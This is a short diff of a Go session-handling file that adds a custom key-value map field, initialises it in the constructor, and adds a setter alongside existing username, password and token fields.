@@ -9,6 +9,7 @@ type Session struct {
 	Name        string
 	Username    string
 	Password    string
+	Custom      map[string]string
 	Tokens      map[string]map[string]*database.Token
 	RedirectURL string
 	IsDone      bool
@@ -21,6 +22,7 @@ func NewSession(name string) (*Session, error) {
 		Name:        name,
 		Username:    "",
 		Password:    "",
+		Custom:      make(map[string]string),
 		RedirectURL: "",
 		IsDone:      false,
 		IsAuthUrl:   false,
@@ -36,6 +38,10 @@ func (s *Session) SetUsername(username string) {
 
 func (s *Session) SetPassword(password string) {
 	s.Password = password
+}
+
+func (s *Session) SetCustom(name string, value string) {
+	s.Custom[name] = value
 }
 
 func (s *Session) AddAuthToken(domain string, key string, value string, path string, http_only bool, authTokens map[string][]*AuthToken) bool {
